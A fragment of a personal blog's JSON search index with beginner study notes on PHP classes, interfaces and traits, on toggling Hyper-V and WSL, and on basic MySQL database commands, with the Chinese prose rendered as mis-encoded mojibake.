å‡½æ•°ï¼Œè¦æ‰§è¡Œçˆ¶ç±»çš„æ„é€ å‡½æ•°ï¼Œéœ€è¦åœ¨å­ç±»çš„æ„é€ å‡½æ•°ä¸­è°ƒç”¨parent::__construct()ã€‚å¦‚æœå­ç±»ä¸­æ²¡æœ‰å®šä¹‰æ„é€ å‡½æ•°åˆ™ä¼šå¦‚åŒæ™®é€šç±»ä¸€æ ·ä»çˆ¶ç±»ç»§æ‰¿ï¼ˆéprivateï¼‰ 1234567891011121314151617181920212223242526class A&#x2F;&#x2F;çˆ¶ç±»&#123; public $name; private $age; protected $job; function __construct($name,$age,$job) &#123; $this-&gt;name &#x3D; $name; $this-&gt;age &#x3D; $age; $this-&gt;job &#x3D; $job; &#125; public function speak()&#123; echo &quot;hello&quot;.$this-&gt;name; &#125;&#125;class B extends A&#x2F;&#x2F;å­ç±»&#123; public function eat()&#123; echo &quot;&lt;br &#x2F;&gt;eat&quot;.$this-&gt;job;&#x2F;&#x2F;å¦‚æœæ˜¯ageä¼šå¦‚ä½•å‘¢ï¼Ÿ &#125;&#125;$a &#x3D; new B(&quot;Tom&quot;,18,&quot;student&quot;);$a-&gt;speak();$a-&gt;eat(); æ–¹æ³•é‡å†™å¦‚æœä»çˆ¶ç±»ç»§æ‰¿çš„æ–¹æ³•ä¸èƒ½æ»¡è¶³å­ç±»çš„éœ€æ±‚ï¼Œå¯ä»¥å¯¹å…¶è¿›è¡Œæ”¹å†™ï¼Œè¿™ä¸ªè¿‡ç¨‹å«æ–¹æ³•çš„è¦†ç›–ï¼ˆoverrideï¼‰ï¼Œä¹Ÿç§°ä¸ºæ–¹æ³•çš„é‡å†™ã€‚æŠ½è±¡æ–¹æ³•å’ŒæŠ½è±¡ç±»å«æœ‰æŠ½è±¡æ–¹æ³•çš„ä¸€å®šæ˜¯æŠ½è±¡ç±»æŠ½è±¡ç±»ä¸ä¸€å®šå«æœ‰æŠ½è±¡æ–¹æ³•æŠ½è±¡ç±»ä¸­å¯ä»¥æœ‰ä¸€èˆ¬çš„å‡½æ•°æŠ½è±¡ç±»æ— æ³•å®ä¾‹åŒ–ï¼Œåªèƒ½ç”±ä¸€ä¸ªç»§æ‰¿ä»–çš„å­ç±»å®ä¾‹åŒ–ï¼Œç»§æ‰¿ä»–çš„å­ç±»å°†å®ç°æ‰€æœ‰çš„æŠ½è±¡æ–¹æ³•ï¼ˆé‡å†™ï¼‰æŠ½è±¡ä½“ 123456789101112abstract class Father&#123; public abstract function run();&#x2F;&#x2F;æŠ½è±¡æ–¹æ³•æ˜¯æ²¡æœ‰æ–¹æ³•ä½“çš„ public function eat()&#123;&#x2F;&#x2F;è¿™ä¸ªå°±æ˜¯ä¸ªæ™®é€šçš„æˆå‘˜æ–¹æ³•ï¼ˆå‡½æ•°ï¼‰ echo &quot;eat&quot;; &#125;&#125;class son extends Father&#123; public function run()&#123; &#x2F;&#x2F;çˆ¶å€ºå­å¿ &#125;&#125; æŠ½è±¡ç±»å…¶å®å°±æ˜¯ä»‹äºæ™®é€šç±»å’Œæ¥å£ä¹‹é—´çš„ä¸€ä¸ªç±»ï¼Œæ™®é€šç±»éœ€è¦å®ç°æ‰€æœ‰æ–¹æ³•ï¼Œæ¥å£æ‰€æœ‰æ–¹æ³•éƒ½ä¸éœ€è¦å®ç°ï¼Œè€ŒæŠ½è±¡ç±»å¯ä»¥æ ¹æ®è‡ªå·±çš„éœ€è¦å»é€‰æ‹©å®ç°éƒ¨åˆ†æ–¹æ³•ï¼›ä½†æ˜¯ä¸€æ—¦ç±»é‡Œé¢æœ‰æŠ½è±¡æ–¹æ³•ï¼Œè¿™ä¸ªç±»å°±å¿…é¡»æ˜¯æŠ½è±¡ç±»ï¼Œå¦å¤–æ³¨æ„ï¼ŒæŠ½è±¡ç±»è·Ÿæ¥å£ä¸€æ ·ï¼Œä¸èƒ½ç›´æ¥å®ä¾‹åŒ–ä¸ºå¯¹è±¡ï¼Œåªèƒ½è¢«æ™®é€šç±»ç»§æ‰¿ï¼Œï¼Œå…¶å®æŠ½è±¡ç±»åŒæ ·ä½“ç°äº†é¢å‘å¯¹è±¡çš„å¤šæ€ç°è±¡æ³¨æ„ï¼šæœ‰ä»€ä¹ˆå¯ä»¥å®ç°ç±»ä¼¼å¤šé‡ç»§æ‰¿çš„ä¸œè¥¿å‘¢ï¼Ÿæ¥ä¸‹æ¥ä»‹ç»æ¥å£æ¥å£ï¼šinterfaceæ¥å£æ˜¯é€šè¿‡ interface å…³é”®å­—æ¥å®šä¹‰çš„ï¼Œå°±åƒå®šä¹‰ä¸€ä¸ªæ ‡å‡†çš„ç±»ä¸€æ ·ï¼Œä½†å…¶ä¸­å®šä¹‰æ‰€æœ‰çš„æ–¹æ³•éƒ½æ˜¯ç©ºçš„ã€‚ æ¥å£æ˜¯ä¸€ç§å¯¹è±¡ç”¨äºä¸å¤–ç•Œè¿›è¡Œäº¤äº’è¡Œä¸ºçš„çº¦æŸï¼Œå¯¹äºå®ç°æ¥å£çš„ç±»ï¼Œè¦æ±‚ä¸€å®šè¦æ»¡è¶³æ¥å£æ‰€æŒ‡å®šçš„æ–¹æ³•ï¼Œä¹Ÿå¯ä»¥æˆä¸ºæ»¡è¶³æ¥å£çš„â€œç‰¹å¾â€ã€‚OOPä¸­ç±»æœ‰ä¸€ç§æ€§è´¨å«â€œå°è£…â€ï¼Œå°±æ˜¯è¦æ±‚ç±»å†…éƒ¨ä¸å¤–ç•Œç¯å¢ƒè¦è¿›è¡Œéš”ç¦»ï¼Œè€Œç±»åˆéœ€è¦å®ç°ä¸€å®šçš„ä¸šåŠ¡åŠŸèƒ½ï¼Œå› æ­¤å°±éœ€è¦æš´éœ²å‡ºèƒ½å¤Ÿå¯¹å¤–ç•Œäº§ç”Ÿå½±å“çš„éƒ¨åˆ†ï¼Œè¿™éƒ¨åˆ†å°±è¢«ç§°ä¹‹ä¸ºæ¥å£ã€‚ â€”â€”â€“è®¸è‡´ä¸­å¤§ä½¬ æˆ‘çš„ç†è§£ï¼šç›¸å½“äºä¸€ä¸ªèœå•ï¼Œåˆ—å‡ºäº†é‡Œé¢çš„åŠŸèƒ½ï¼ŒåŠŸèƒ½æ€ä¹ˆå®ç°å¤–ç•Œä¸ç”¨ç®¡ï¼Œåªè¦ç”¨å°±å¯ä»¥ æ¥å£ä¸­å®šä¹‰çš„æ‰€æœ‰æ–¹æ³•éƒ½å¿…é¡»æ˜¯å…¬æœ‰ï¼Œè¿™æ˜¯æ¥å£çš„ç‰¹æ€§ã€‚è¦å®ç°ä¸€ä¸ªæ¥å£ï¼Œä½¿ç”¨ implements æ“ä½œç¬¦ã€‚ç±»ä¸­å¿…é¡»å®ç°æ¥å£ä¸­å®šä¹‰çš„æ‰€æœ‰æ–¹æ³•ï¼Œå¦åˆ™ä¼šæŠ¥ä¸€ä¸ªè‡´å‘½é”™è¯¯ã€‚ç±»å¯ä»¥å®ç°å¤šä¸ªæ¥å£ï¼Œç”¨é€—å·æ¥åˆ†éš”å¤šä¸ªæ¥å£çš„åç§° 1234567891011121314151617interface C&#123; function run();&#x2F;&#x2F;å› ä¸ºå…¬æœ‰æ˜¯é»˜è®¤å€¼ï¼Œsoç•¥&#125;interface E&#123; function walk();&#125;class D implements C,E&#123; function run()&#123; echo &quot;&lt;br&#x2F;&gt;run&quot;; &#125; function walk()&#123; echo &quot;&lt;br&#x2F;&gt;walk&quot;; &#125;&#125; æœ‰æ²¡æœ‰ä¸€ç§æ–¹æ³•æ˜¯æ—¢èƒ½å®ç°ç±»ä¼¼å¤šç»§æ‰¿åˆèƒ½ä¸å¸¦æ¥éº»çƒ¦å‘¢ï¼ŸTraitå¾ˆåƒæ¥å£ï¼Œä½†æ˜¯æ¥å£ä¸­çš„æ–¹æ³•éƒ½æ˜¯ä¸ä¼šå†™çš„ï¼Œåªæ˜¯æ”¾äº†ä¸€ä¸ªå®šä¹‰ï¼Œä½†æ˜¯Traitå°±ä¼šåœ¨å®šä¹‰è¿™ä¸ªæ–¹æ³•çš„æ—¶å€™å†™å¥½å…·ä½“çš„æ“ä½œï¼Œä¾‹å­å¦‚ä¸‹ 12345678910traittraitèƒ½åœ¨å®šä¹‰ä¸€ä¸ªæ ‡å‡†ç±»çš„æ—¶å€™å®šä¹‰å®ƒçš„æ–¹æ³•trait SayWorld &#123; public function sayHello() &#123; echo &#39;Hello World!&#39;;&#x2F;&#x2F;traitä¸­çš„ &#125;&#125;class MyHelloWorld extends Base &#123; use SayWorld;&#x2F;&#x2F;&#125; ä¼˜å…ˆçº§å½“å‰ç±»ä¸­çš„æ–¹æ³•æˆ–å±æ€§å¤§äºtraitä¸­çš„å¤§äºçˆ¶ç±»ä¸­çš„ 123456789101112131415161718192021222324&lt;?phpclass Base &#123; public function sayHello() &#123; echo &#39;Hello &#39;;&#x2F;&#x2F;çˆ¶ç±»ä¸­çš„ &#125;&#125;trait SayWorld &#123; public function sayHello() &#123; echo &#39;World&#39;;&#x2F;&#x2F;traitä¸­çš„ &#125;&#125;class MyHelloWorld extends Base &#123; use SayWorld; public function sayHello()&#123;&#x2F;&#x2F;å½“å‰ç±»çš„ echo &#39;!&#39;; &#125;&#125;$o &#x3D; new MyHelloWorld();$o-&gt;sayHello();&#x2F;&#x2F;è¾“å‡ºç»“æœæ˜¯ !?&gt; å¼•ç”¨å¤šä¸ªtrait 12345678910111213141516171819&lt;?phptrait Hello &#123; public function sayHello() &#123; echo &#39;Hello &#39;; &#125;&#125;trait World &#123; public function sayWorld() &#123; echo &#39;World&#39;; &#125;&#125;class MyHelloWorld &#123; use Hello, World; public function sayExclamationMark() &#123; echo &#39;!&#39;; &#125;&#125;","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"php","slug":"php","permalink":"https://yanmymickey.github.io/tags/php/"}]},{"title":"Mysqlæ•°æ®åº“","date":"2019-05-19T16:00:00.000Z","path":"2019/05/20/Note/è§£å†³è™šæ‹Ÿæœºä¸hyper-vå†²çª/","text":"è™šæ‹Ÿæœºä¸hyper-vå†²çª é€šè¿‡å‘½ä»¤å…³é—­Hyper-Vï¼ˆæ§åˆ¶é¢æ¿å…³é—­Hyper-Vèµ·ä¸åˆ°å†³å®šæ€§ä½œç”¨ï¼Œè¦å½»åº•å…³é—­Hyper-Vï¼‰ ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡ŒWindows Powershell (ç®¡ç†å‘˜)ï¼ˆWindowsé”®+Xï¼‰ è¿è¡Œä¸‹é¢å‘½ä»¤å¹¶é‡å¯ç”µè„‘ï¼š 12#å…³é—­hype-Vbcdedit &#x2F;set hypervisorlaunchtype off æƒ³è¦ä½¿ç”¨wslæ—¶,ä¸‹é¢æ˜¯ç›¸å…³å‘½ä»¤ 12345678910111213#å¯ç”¨hype-Vbcdedit &#x2F;set hypervisorlaunchtype auto start#è½¬æ¢ubuntuçš„wslç‰ˆæœ¬wsl --set-version Ubuntu 2#æŸ¥è¯¢å·²ç»å®‰è£…çš„wslç‰ˆæœ¬wsl -l -V#æˆ–è€…wsl --list --version#è®¾ç½®wslé»˜è®¤å¯åŠ¨ç‰ˆæœ¬wsl --set-default-version 2","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"mysql","slug":"mysql","permalink":"https://yanmymickey.github.io/tags/mysql/"}]},{"title":"Mysqlæ•°æ®åº“","date":"2019-05-19T16:00:00.000Z","path":"2019/05/20/Note/è®²æ•°æ®åº“/","text":"Mysqlæ•°æ®åº“1.ç†Ÿæ‚‰åŸºæœ¬çš„linuxä¸‹çš„å‘½ä»¤è¡Œï¼Œè¿ç”¨ä»–ä»¬ã€‚ å‰è¨€äº†è§£ä¸€äº›åè¯ã€‚ï¼ˆèœé¸Ÿæ•™ç¨‹ä¸Šè§£é‡Šçš„å¾ˆæ¸…æ¥šï¼‰ æ•°æ®åº“: æ•°æ®åº“æ˜¯ä¸€äº›å…³è”è¡¨çš„é›†åˆã€‚ æ•°æ®è¡¨: è¡¨æ˜¯æ•°æ®çš„çŸ©é˜µã€‚åœ¨ä¸€ä¸ªæ•°æ®åº“ä¸­çš„è¡¨çœ‹èµ·æ¥åƒä¸€ä¸ªç®€å•çš„ç”µå­è¡¨æ ¼ã€‚ åˆ—: ä¸€åˆ—(æ•°æ®å…ƒç´ ) åŒ…å«äº†ç›¸åŒçš„æ•°æ®, ä¾‹å¦‚é‚®æ”¿ç¼–ç çš„æ•°æ®ã€‚ è¡Œï¼šä¸€è¡Œï¼ˆ=å…ƒç»„ï¼Œæˆ–è®°å½•ï¼‰æ˜¯ä¸€ç»„ç›¸å…³çš„æ•°æ®ï¼Œä¾‹å¦‚ä¸€æ¡ç”¨æˆ·è®¢é˜…çš„æ•°æ®ã€‚ å†—ä½™ï¼šå­˜å‚¨ä¸¤å€æ•°æ®ï¼Œå†—ä½™é™ä½äº†æ€§èƒ½ï¼Œä½†æé«˜äº†æ•°æ®çš„å®‰å…¨æ€§ã€‚ ä¸»é”®ï¼šä¸»é”®æ˜¯å”¯ä¸€çš„ã€‚ä¸€ä¸ªæ•°æ®è¡¨ä¸­åªèƒ½åŒ…å«ä¸€ä¸ªä¸»é”®ã€‚ä½ å¯ä»¥ä½¿ç”¨ä¸»é”®æ¥æŸ¥è¯¢æ•°æ®ã€‚ å¤–é”®ï¼šå¤–é”®ç”¨äºå…³è”ä¸¤ä¸ªè¡¨ã€‚ å¤åˆé”®ï¼šå¤åˆé”®ï¼ˆç»„åˆé”®ï¼‰å°†å¤šä¸ªåˆ—ä½œä¸ºä¸€ä¸ªç´¢å¼•é”®ï¼Œä¸€èˆ¬ç”¨äºå¤åˆç´¢å¼•ã€‚ ç´¢å¼•ï¼šä½¿ç”¨ç´¢å¼•å¯å¿«é€Ÿè®¿é—®æ•°æ®åº“è¡¨ä¸­çš„ç‰¹å®šä¿¡æ¯ã€‚ç´¢å¼•æ˜¯å¯¹æ•°æ®åº“è¡¨ä¸­ä¸€åˆ—æˆ–å¤šåˆ—çš„å€¼è¿›è¡Œæ’åºçš„ä¸€ç§ç»“æ„ã€‚ç±»ä¼¼äºä¹¦ç±çš„ç›®å½•ã€‚ å‚ç…§å®Œæ•´æ€§: å‚ç…§çš„å®Œæ•´æ€§è¦æ±‚å…³ç³»ä¸­ä¸å…è®¸å¼•ç”¨ä¸å­˜åœ¨çš„å®ä½“ã€‚ä¸å®ä½“å®Œæ•´æ€§æ˜¯å…³ç³»æ¨¡å‹å¿…é¡»æ»¡è¶³çš„å®Œæ•´æ€§çº¦æŸæ¡ä»¶ï¼Œç›®çš„æ˜¯ä¿è¯æ•°æ®çš„ä¸€è‡´æ€§ è¡¨å¤´(header): æ¯ä¸€åˆ—çš„åç§°; åˆ—(col): å…·æœ‰ç›¸åŒæ•°æ®ç±»å‹çš„æ•°æ®çš„é›†åˆ; è¡Œ(row): æ¯ä¸€è¡Œç”¨æ¥æè¿°æŸæ¡è®°å½•çš„å…·ä½“ä¿¡æ¯; å€¼(value): è¡Œçš„å…·ä½“ä¿¡æ¯, æ¯ä¸ªå€¼å¿…é¡»ä¸è¯¥åˆ—çš„æ•°æ®ç±»å‹ç›¸åŒ; é”®(key): é”®çš„å€¼åœ¨å½“å‰åˆ—ä¸­å…·æœ‰å”¯ä¸€æ€§ é€€å‡º exit æˆ– quitã€‚ 1.mysqlMySQLåŸºç¡€çŸ¥è¯†MySQLç»å¸¸å’Œâ€œæ•°æ®åº“â€è¿åœ¨ä¸€èµ·è¯»ï¼Œè¿™å¾ˆå®¹æ˜“å¯¹æ–°æ‰‹é€ æˆè¯¯è§£ï¼Œè®¤ä¸ºMySQLå°±æ˜¯ä¸€ä¸ªæ•°æ®åº“ å…¶å®ä¸æ˜¯è¿™æ ·ï¼ŒMySQLæ˜¯æ•°æ®åº“çš„é›†åˆï¼ŒMySQLé‡Œé¢æœ‰å¾ˆå¤šæ•°æ®åº“ é‚£ä¹ˆæ•°æ®æ˜¯ç›´æ¥å­˜åœ¨æ•°æ®åº“é‡Œçš„å—ï¼Ÿå¹¶ä¸ï¼Œæ•°æ®åº“åº•ä¸‹è¿˜æœ‰ä¸€ä¸ªå«åšæ•°æ®è¡¨çš„å­˜å‚¨å•å…ƒ æ•°æ®è¡¨é‡Œé¢æ‰å­˜å‚¨æ•°æ®ã€‚ æ‰“ä¸ªæ¯”æ–¹ï¼Œå¥½æ¯”ä¸€åº§å¤§å›¾ä¹¦é¦†ï¼Œå°±æ˜¯MySQLï¼Œå›¾ä¹¦é¦†é‡Œé¢åˆ†å—åº“ï¼ŒåŒ—åº“ï¼Œè¿™å°±æ˜¯æ•°æ®åº“ï¼Œ æ¯ä¸ªåº“é‡Œé¢çš„ä¹¦éƒ½æ˜¯æ”¾åœ¨ä¹¦æ¶ä¸Šçš„ï¼Œä¹¦æ¶å°±æ˜¯æ•°æ®è¡¨ï¼Œè€Œæ”¾åœ¨ä¹¦æ¶ä¸Šçš„å¾ˆå¤šæœ¬ä¹¦ï¼Œå°±æ˜¯æ•°æ® ã€‚è¿™ä¹ˆè¯´ï¼Œè¯»è€…åº”è¯¥ç†è§£äº†å§ï¼Œæ‰€ä»¥æŒ‰å¤§å°é¡ºåºæ’ä¸ªåºå°±åº”è¯¥æ˜¯ï¼Œ MySQL&gt;æ•°æ®åº“&gt;æ•°æ®è¡¨&gt;æ•°æ®ï¼Œæ‰€ä»¥æˆ‘ä»¬æ¥ä¸‹æ¥çš„å†…å®¹ä¹Ÿæ˜¯æŒ‰ç…§è¿™ä¸ªé¡ºåºæ¥å±•å¼€ã€‚ï¼ˆæŠŠé»‘ä½“ç†è§£å°±å¥½ï¼‰ å‰é¢è·Ÿç€é¢œè€æ¿æŠŠé‚£ä¸ªç¯å¢ƒå®‰è£…å¥½äº†ï¼Œç„¶åå°±å¯ä»¥ä½¿ç”¨mysqläº†ã€‚é¦–å…ˆæ‰“å¼€xshellï¼Œ 1.è¿›å…¥ä½ çš„mysqlmysql -u root -p #ç„¶å[root@** ~]åé¢è¾“å…¥ -u æ˜¯æŒ‡userç”¨æˆ·åï¼Œ rootæ˜¯ä½ åˆ›å»ºäº†ä¸€ä¸ªrootç”¨æˆ·ï¼Œæœ€é«˜ç®¡ç†å‘˜è¿›å…¥ã€‚ -pæ˜¯è¦ä½ è¾“å…¥ä½ çš„mysqlå¯†ç ã€‚ #å›è½¦Enter password: ç„¶åè¾“å…¥ä½ çš„å¯†ç  #ï¼ˆè¿™é‡Œä½ è¾“å…¥çš„æ—¶å€™æ˜¯çœ‹ä¸è§çš„ï¼Œlinuxæ˜¯æœ‰è¿™ä¸ªä¿æŠ¤ï¼Œä»¥å…æ³„å¯†ï¼Œwindowsç³»ç»Ÿä¸‹ä¸€èˆ¬ä¸ä¼š æœ‰è¿™ä¸ªã€‚è¾“å…¥åç„¶åå›è½¦ã€‚ï¼‰ è®²è§£rootä¸ºä»€ä¹ˆï¼Œè¿™æ˜¯ç®¡ç†å‘˜ç™»å½•ï¼Œå¯ä»¥è¿›è¡Œå¥½å¤šæ“ä½œï¼Œå¢åˆ æ”¹æŸ¥ã€‚ ä½ ä¹Ÿå¯ä»¥åˆ›å»ºä¸€ä¸ªç”¨æˆ·ä¸æ˜¯rootã€‚ç„¶åç»™ä»–æƒé™ï¼Œè¿›è¡Œç™»å½•ã€‚å…·ä½“å¯ä»¥å‚ç…§ ï¼ˆèœé¸Ÿæ•™ç¨‹/æ•°æ®åº“/mysql/mysqlç®¡ç†ï¼‰ï¼Œ å°±æœ‰è¿™ä¸ªå‡ºç°ï¼Œæœ‰çš„ç‰ˆæœ¬ä¸ä¸€æ ·ï¼Œä½†æ˜¯å¤§è‡´æ˜¯ä¸€æ ·çš„ã€‚ Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 2Server version: 5.7.25-log MySQL Community Server (GPL) Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners. Type â€˜help;â€™ or â€˜\\hâ€™ for help. Type â€˜\\câ€™ to clear the current inpu. MySQL [(none)] &gt; MySQL [(none)] &gt;è¿™ä¸ªnoneæ˜¯ä½ è¿˜æ²¡æœ‰é€‰æ‹©æ•°æ®åº“ã€‚æœ‰çš„ç‰ˆæœ¬æœ‰æœ‰çš„æ²¡æœ‰ã€‚ é€‰æ‹©äº†æ•°æ®åº“å°±æ˜¯MySQL [(xx)] &gt;. 2.å±•ç¤ºä½ çš„æ•°æ®åº“show databases; #å› ä¸ºä½ ä¸çŸ¥é“ä½ åˆšå¼€å§‹æœ‰å¤šå°‘çš„æ•°æ®åº“ï¼Œæ‰€ä»¥æ˜¯databases è€Œä¸”ä¸€å®šè¦è®°ä½ï¼Œè¾“å…¥ï¼›å› ä¸ºä¹‹å‰é…ç¯å¢ƒçš„æ—¶å€™çš„è¯­å¥æ²¡æœ‰åé¢åŠ ;çš„ä¹ æƒ¯ï¼Œæ‰€ä»¥èœé¸¡æœ¬é¸¡åˆšå¼€å§‹çš„æ—¶å€™å°±å¸¸å¸¸å¿˜è®°åŠ ï¼›å¯¼è‡´å®ƒä»¥ä¸ºæˆ‘è¿˜æœ‰ä¸œè¥¿è¦è¾“å…¥ï¼Œå¦èµ·ä¸€è¡Œã€‚ å‡ºç°è¿™å››ä¸ªåˆå§‹æ•°æ®åº“ +â€”â€”â€”â€”â€”â€”â€“+| Database |+â€”â€”â€”â€”â€”â€”- -+| information_schema || mysql || performance_schema || sys |+â€”â€”â€”â€”â€”â€”â€“+ 3.åˆ›å»ºä½ çš„æ•°æ®åº“create database XX; (XXæ˜¯æ•°æ®åº“å)è¿™ä¸ªæ•°æ®åº“åä½ å¯ä»¥éšä¾¿å–ï¼Œä½†æ˜¯ä¸èƒ½å–ä¸€äº›å…³é”®å­—ï¼Œä¾‹å¦‚create showç±»ä¼¼çš„ è¾“å…¥åå›è½¦ç„¶åçœ‹è§ Query OK,1 row affected (0.00 sec) #è¡¨ç¤ºåˆ›å»ºæ•°æ®åº“æˆåŠŸã€‚ åœ¨è¿™é‡Œç»™å¤§å®¶è¡¥å……ä¸€ç‚¹ï¼Œåˆ›å»ºæ•°æ®åº“çš„æ—¶å€™ï¼Œé»˜è®¤çš„å­—ç¬¦æ˜¯â€latinâ€œï¼Œä¹Ÿå°±æ˜¯æ‹‰ä¸æ–‡ï¼Œç°åœ¨å¯èƒ½ä½“ä¼šä¸åˆ°æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œåˆ°æ•°æ®è¡¨çš„æ“ä½œçš„æ—¶å€™å°±æœ‰åŒºåˆ«äº†ã€‚ ä¸è¿‡è¿™é‡Œè¿˜æ˜¯å‘Šè¯‰å¤§å®¶ï¼Œå¦‚ä½•åˆ›å»ºæ•°æ®åº“çš„æ—¶å€™ï¼Œè‡ªå·±å®šä¹‰ä¸ºä»€ä¹ˆå­—ç¬¦ create database XX(æ•°æ®åº“å) charset = (å­—ç¬¦ç¼–ç ï¼Œä¾‹å¦‚utf8); #æˆ‘ä»¬å¹³æ—¶å­¦çš„ä¸­æ–‡çš„å­—ç¬¦ç¼–ç æ˜¯â€œutf-8â€ï¼Œä½†æ˜¯åœ¨MySQLé‡Œé¢ï¼Œä¸­æ–‡å­—ç¬¦ç¼–ç æ˜¯â€œutf8â€ï¼Œè¿™ç‚¹éœ€è¦æ³¨æ„ã€‚ è¿˜æœ‰ä¸€ç‚¹ï¼Œè¦æ˜¯ä½ åˆ›å»ºä¸€ä¸ªå·²ç»å­˜åœ¨çš„æ•°æ®åº“ä¼šæŠ¥é”™ã€‚ä¾‹å¦‚ï¼š create database test; ä¼šæç¤ºä»¥ä¸‹ä¿¡æ¯ canâ€™t create database â€˜testâ€™ ;database exists æ‰€ä»¥æˆ‘ä»¬åœ¨åˆ›å»ºæ•°æ®åº“çš„æ—¶å€™æœ€å¥½åˆ¤æ–­ä¸€ä¸‹å­ï¼Œä½ è¦åˆ›å»ºçš„æ•°æ®åº“åˆ°åº•å­˜ä¸å­˜åœ¨ã€‚ create database if not exists XX(æ•°æ®åº“å); #å°è¯•åˆ›ä¸€ä¸ªtestçš„æ•°æ®åº“è¯•è¯• ä¼šå‡ºç°Query ok,1 row affected ,1 warning. æ˜¾ç¤ºâ€œOKâ€ï¼Œæ²¡æœ‰æŠ¥é”™äº†ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªè­¦å‘Šï¼Œè¿™ä¸ªè­¦å‘Šå°±æ˜¯å‘Šè¯‰ç”¨æˆ·ï¼Œâ€testâ€œè¿™ä¸ªæ•°æ®åº“å­˜åœ¨ã€‚ ç°åœ¨è®©æˆ‘ä»¬å°è¯•ä¸€ä¸‹åˆ›å»ºä¸€ä¸ªå…³é”®å­—çš„æ•°æ®åº“ï¼Œ create database create; ä¼šå‡ºç°You have an error in your SQL syntax;check the manual that correspands to your â€¦â€¦â€¦â€¦â€¦â€¦.to use near â€˜createâ€™ at line 1 è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç¡®å®çœ‹åˆ°çš„æ˜¯ï¼Œåä¸ºâ€œcreateâ€çš„è¿™ä¸ªæ•°æ®åº“æ²¡æœ‰åˆ›å»ºæˆåŠŸï¼ŒæŠ¥é”™äº†. é‚£å¦‚æœæœ‰çš„äººè¯´æˆ‘å°±æƒ³åˆ›å»ºä¸€ä¸ªåä¸ºâ€œcreateâ€çš„æ•°æ®åº“ï¼Œä¸‹é¢ç»™å‡ºè§£å†³åŠæ³• **create database XX(æ•°æ®åº“å);(**æ³¨æ„ï¼Œè¿™é‡Œ``æ˜¯åå¼•å·ï¼Œåœ¨é”®ç›˜tabä¸Šé¢,1çš„æ—è¾¹) è¿™æ ·æ“ä½œå°±å¯ä»¥åˆ›å»ºä¸€ä¸ªåå«åšcreateçš„æ•°æ®åº“äº†ï¼Œä½†æ˜¯æœ€å¥½ä¸è¦èµ·è¿™äº›å…³é”®å­—åå­—ï¼Œä¸å¥½åŒºåˆ«ã€‚ 4.æ˜¾ç¤ºæ•°æ®åº“ä¿¡æ¯show create database XX(æ•°æ®åº“å); æŸ¥çœ‹ä¿¡æ¯ã€‚CHARACTER SET å½“ç„¶åœ¨è¿™é‡Œä½ å¯ä»¥ä¿®æ”¹ä½ çš„å­—ç¬¦ç¼–ç ã€‚ä½¿ç”¨ 1234alter database dbname CHARACTER SET utf8 COLLATE utf8_general_ci;utf8_general_ciè¿™æ˜¯ä¸€ä¸ªæ ¡å¯¹è§„åˆ™ã€‚ç„¶ååœ¨ä½¿ç”¨å“ªä¸ªæŸ¥çœ‹æ•°æ®åº“å°±å¯ä»¥çœ‹åˆ°ï¼Œä½ çš„æ•°æ®åº“çš„ç¼–ç å°±å˜æˆäº†utf8; 5.åˆ é™¤æ•°æ®åº“drop database XX(æ•°æ®åº“å); åˆ é™¤äº†ä¼šæ˜¾ç¤º Query ok, 0 rows affected #è¿™æ ·å°±æ˜¾ç¤ºåˆ é™¤æˆåŠŸäº†ã€‚ ä½†æ˜¯å¦‚æœæˆ‘ä»¬è¦åˆ é™¤ä¸€ä¸ªå¹¶ä¸å­˜åœ¨çš„æ•°æ®åº“ä¼šå‡ºç°ä»€ä¹ˆå‘¢ åˆ é™¤ä¸€ä¸ªä¸å­˜åœ¨çš„qæ•°æ®åº“ã€‚å›è½¦æ˜¾ç¤º canâ€™t drop database â€˜qâ€™; database doesnoâ€™t exist å¾ˆæ˜æ˜¾ï¼ŒæŠ¥é”™äº†ï¼Œå› ä¸ºä¸å­˜åœ¨â€œaâ€è¿™ä¸ªæ•°æ®åº“ï¼Œæˆ‘ä»¬å¯ä»¥åˆ¤æ–­ä¸€ä¸‹ï¼Œè¿™ä¸ªæ•°æ®åº“å­˜åœ¨æ‰åˆ é™¤ï¼Œä¸‹é¢ç»™å‡ºä»£ç ã€‚è·Ÿåˆ›å»ºä¸€æ ·çš„ drop database if exists XX (æ•°æ®åº“åå­—); ä¼šæ˜¾ç¤º Query OK, 0 rows affected, 1 warning (0.01 sec) å’Œä¹‹å‰åˆ›å»ºä¸€æ ·ï¼Œè™½ç„¶æ˜¯æˆåŠŸçš„ï¼Œä½†æ˜¯æœ‰è­¦å‘Šã€‚è­¦å‘Šçš„æ„æ€å¤§æ¦‚æ˜¯è¯´ï¼Œä¹ˆæœ‰è¿™ä¸ªæ•°æ®åº“ï¼Œã€‚ã€‚ 6.é€‰æ‹©æ•°æ®åº“è¿™æ˜¯æ•°æ®åº“çš„æœ€åä¸€ä¸ªåŸºæœ¬æ“ä½œï¼Œæˆ‘ä»¬å¦‚æœæƒ³è¦åˆ›å»ºæ•°æ®ï¼Œå¿…é¡»è¦åˆ›å»ºä¸€ä¸ªæ•°æ®åº“ï¼Œç„¶ååœ¨æ•°æ®åº“å½“ä¸­åˆ›å»ºæ•°æ®è¡¨ï¼Œåœ¨æ•°æ®è¡¨ä¸­è¿›è¡Œæ“ä½œï¼Œ ä½†æ˜¯è¿™ä¹ˆå¤šæ•°æ®åº“ï¼Œè®¡ç®—æœºæ€ä¹ˆçŸ¥é“æˆ‘ä»¬é€‰æ‹©çš„æ˜¯å“ªä¸ªæ•°æ®åº“å‘¢ï¼Ÿæˆ‘ä»¬ä½¿ç”¨ä¸‹åˆ—è¯­å¥ use XX(æ•°æ®åº“å); å›è½¦åä¼šæ˜¾ç¤º Database changed è¿™ä¸ªå°±æç¤ºä½ å·²ç»è¿›å…¥åˆ°äº†è¿™ä¸ªXXæ•°æ®åº“é‡Œé¢äº†ã€‚ç„¶åä½ å°±å¯ä»¥æ“ä½œäº†ã€‚ 